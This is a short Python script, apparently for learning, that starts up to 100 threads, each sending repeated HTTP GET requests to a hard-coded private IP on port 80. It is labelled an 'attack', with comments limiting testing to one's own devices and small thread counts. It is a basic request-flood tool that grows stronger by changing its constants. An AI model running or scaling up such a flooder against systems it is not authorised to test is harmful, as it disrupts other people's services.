import threading
import socket
import time

# YOUR TARGET (only test on devices you own)
ip = "192.168.100.1"   # change only if you own the target
port = 80
info = (ip, port)

MAX_THREADS = 100       # keep small while learning (e.g., 10)
ATTEMPTS_PER_THREAD = 50  # finite attempts per thread
SOCKET_TIMEOUT = 10      # seconds

stop_event = threading.Event()

def attack(thread_id, attempts):
    for attempt in range(attempts):
        if stop_event.is_set():
            print(f"[t{thread_id}] stop requested, exiting")
            break

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(SOCKET_TIMEOUT)        # important: prevents blocking forever
            s.connect(info)                    # connect expects a tuple (host, port)
            req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
            s.sendall(req.encode("ascii"))
            try:
                resp = s.recv(1024)
                print(f"[t{thread_id}] attempt {attempt}: got {len(resp)} bytes")
            except socket.timeout:
                
                print(f"[t{thread_id}] attempt {attempt}: recv timed out")

        except socket.timeout as e:
            print(f"[t{thread_id}] attempt {attempt}: socket timeout -> {e}")
        except ConnectionRefusedError as e:
            print(f"[t{thread_id}] attempt {attempt}: connection refused -> {e}")
        except OSError as e:
            print(f"[t{thread_id}] attempt {attempt}: OS error -> {e}")
        except Exception as e:
            print(f"[t{thread_id}] attempt {attempt}: unexpected error -> {e}")
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass

        
        time.sleep(0.2)

def main():
    threads = []
    try:
        for i in range(MAX_THREADS):
            t = threading.Thread(target=attack, args=(i, ATTEMPTS_PER_THREAD), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("Main: KeyboardInterrupt received -> signalling threads to stop")
        stop_event.set()
        for t in threads:
            t.join()
    finally:
        print("Main: finished")

if __name__ == "__main__":
    main()
